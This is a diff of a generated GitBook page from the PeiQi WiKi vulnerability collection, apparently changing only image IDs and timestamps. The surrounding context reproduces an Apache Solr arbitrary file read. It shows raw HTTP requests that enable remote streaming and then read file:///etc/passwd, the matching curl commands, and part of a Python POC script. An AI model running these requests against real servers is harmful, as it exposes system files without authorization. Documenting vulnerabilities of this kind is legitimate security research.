@@ -5139,12 +5139,12 @@
 </blockquote>
 <h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
 <p>&#x8BBF;&#x95EE; Solr Admin &#x7BA1;&#x7406;&#x5458;&#x9875;&#x9762;</p>
-<p><a href="image/solr-27.png" data-lightbox="4c9fcbb7-3bb7-4e32-8905-99a9eaa515ee" data-title=""><img src="image/solr-27.png" alt=""></a></p>
+<p><a href="image/solr-27.png" data-lightbox="d6e2cca4-d4b3-4860-bdec-b5c835d88d06" data-title=""><img src="image/solr-27.png" alt=""></a></p>
 <p>&#x83B7;&#x53D6;core&#x7684;&#x4FE1;&#x606F;</p>
 <pre><code>http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&amp;wt=json
-</code></pre><p><a href="image/solr-28.png" data-lightbox="2803a8ce-e3a2-439e-b4c0-6202b0a4d124" data-title=""><img src="image/solr-28.png" alt=""></a></p>
+</code></pre><p><a href="image/solr-28.png" data-lightbox="43f8d5d8-d03d-4529-a8bc-d3e6ab2deb44" data-title=""><img src="image/solr-28.png" alt=""></a></p>
 <p>&#x53D1;&#x9001;&#x8BF7;&#x6C42;</p>
-<p><a href="image/solr-29.png" data-lightbox="e74f08e8-bff2-46ab-91ae-4486e030a45f" data-title=""><img src="image/solr-29.png" alt=""></a></p>
+<p><a href="image/solr-29.png" data-lightbox="0767c93a-66c1-4ad8-b026-5fdadc9236a4" data-title=""><img src="image/solr-29.png" alt=""></a></p>
 <p>&#x8BF7;&#x6C42;&#x5305;&#x5982;&#x4E0B;</p>
 <pre><code>POST /solr/ckan/config HTTP/1.1
 Host: xxx.xxx.xxx:8983
@@ -5162,7 +5162,7 @@ Connection: close
 
 {&quot;set-property&quot;:{&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true},&quot;olrkzv64tv&quot;:&quot;=&quot;}
 </code></pre><p>&#x518D;&#x8FDB;&#x884C;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</p>
-<p><a href="image/solr-30.png" data-lightbox="058b0fee-d926-429b-bd99-1c1e8f6d7d71" data-title=""><img src="image/solr-30.png" alt=""></a></p>
+<p><a href="image/solr-30.png" data-lightbox="e4955f69-7c08-4c0f-915d-0ccfe39be857" data-title=""><img src="image/solr-30.png" alt=""></a></p>
 <p>&#x8BF7;&#x6C42;&#x5305;&#x5982;&#x4E0B;</p>
 <pre><code>POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
 Host: xxx.xxx.xxx.xxx:8983
@@ -5179,7 +5179,7 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
 Connection: close
 
 stream.url=file:///etc/passwd
-</code></pre><p><a href="image/solr-31.png" data-lightbox="9aa3b3b7-d418-49c8-9f10-e816978ca464" data-title=""><img src="image/solr-31.png" alt=""></a></p>
+</code></pre><p><a href="image/solr-31.png" data-lightbox="851b7211-c225-4ac0-8884-31f8a652767f" data-title=""><img src="image/solr-31.png" alt=""></a></p>
 <p>Curl&#x8BF7;&#x6C42;&#x4E3A;</p>
 <pre><code class="lang-sh">curl <span class="hljs-_">-d</span> <span class="hljs-string">&apos;{&quot;set-property&quot; : {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true}}&apos;</span> http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H <span class="hljs-string">&apos;Content-type:application/json&apos;</span>
 
@@ -5268,17 +5268,17 @@ curl <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx:8983/solr/db/debug/d
         File_name = str(input(<span class="hljs-string">&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;</span>))
         POC_3(target_url, core_name, File_name)
 </code></pre>
-<p><a href="image/solr-32.png" data-lightbox="bda14b10-8c70-4ed4-a8e0-6303ced26d0c" data-title=""><img src="image/solr-32.png" alt=""></a></p>
+<p><a href="image/solr-32.png" data-lightbox="0a0f37af-8ca5-41c7-a388-8b25473dbf95" data-title=""><img src="image/solr-32.png" alt=""></a></p>
 <h2 id="goby--poc">Goby &amp; POC</h2>
 <blockquote>
 <p>&#x5DF2;&#x4E0A;&#x4F20; <a href="https://github.com/PeiQi0/PeiQi-WIKI-POC" target="_blank">https://github.com/PeiQi0/PeiQi-WIKI-POC</a> Goby &amp; POC &#x76EE;&#x5F55;&#x4E2D;</p>
 <p>Apache_Solr_Arbitrary_File_Read.json</p>
 </blockquote>
-<p><a href="image/solr-33.png" data-lightbox="3b1bcc0a-f705-48ee-bcae-aa6dfb3505d3" data-title=""><img src="image/solr-33.png" alt=""></a></p>
+<p><a href="image/solr-33.png" data-lightbox="9b571d38-596e-4dea-9990-53a7b637524d" data-title=""><img src="image/solr-33.png" alt=""></a></p>
 <h2 id="&#x53C2;&#x8003;&#x6587;&#x7AE0;">&#x53C2;&#x8003;&#x6587;&#x7AE0;</h2>
 <p><a href="https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ" target="_blank">https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ</a> </p>
 <footer class="page-footer"><span class="copyright">PeiQi WiKi&#x6587;&#x5E93; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#xFF1A;
-2021-04-20 15:05:14
+2021-04-28 12:43:09
 </span></footer>
                                 
                                 </section>
@@ -5322,7 +5322,7 @@ curl <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx:8983/solr/db/debug/d
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Apache Solr 任意文件读取漏洞","level":"1.4.4.8.7","depth":4,"next":{"title":"Apache HTTPd","level":"1.4.4.9","depth":3,"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/README.md","ref":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/README.md","articles":[{"title":"Apache HTTPd 换行解析漏洞 CVE-2017-15715","level":"1.4.4.9.1","depth":4,"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.md","ref":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.md","articles":[]}]},"previous":{"title":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957","level":"1.4.4.8.6","depth":4,"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.md","ref":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr 任意文件读取漏洞.md","mtime":"2021-04-20T15:05:14.666Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-20T15:06:01.185Z"},"basePath":"../../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Apache Solr 任意文件读取漏洞","level":"1.4.4.8.7","depth":4,"next":{"title":"Apache HTTPd","level":"1.4.4.9","depth":3,"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/README.md","ref":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/README.md","articles":[{"title":"Apache HTTPd 换行解析漏洞 CVE-2017-15715","level":"1.4.4.9.1","depth":4,"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.md","ref":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.md","articles":[]}]},"previous":{"title":"Apache Solr RCE 未授权上传漏洞 CVE-2020-13957","level":"1.4.4.8.6","depth":4,"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.md","ref":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.md","articles":[]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","theme-comscore","splitter","alerts","chapter-fold","code","github","favicon","accordion","-lunr","-search","search-pro","emphasize","-sharing","sharing-plus","tbfed-pagefooter","lightbox","flexible-alerts","pageview-count"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"PeiQi WiKi文库","modify_label":"文件更新时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"emphasize":{},"github":{"url":"https://github.com/PeiQi0/PeiQi-WIKI"},"splitter":{},"search-pro":{},"accordion":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":{},"lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"back-to-top-button":{},"pageview-count":{},"alerts":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"}},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"PeiQi","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"PeiQi WiKi文库","language":"zh-hans","gitbook":"*","description":"WiKi文库"},"file":{"path":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr 任意文件读取漏洞.md","mtime":"2021-04-28T12:43:09.777Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-28T12:44:00.289Z"},"basePath":"../../../..","book":{"language":""}});
         });
     </script>
 </div>
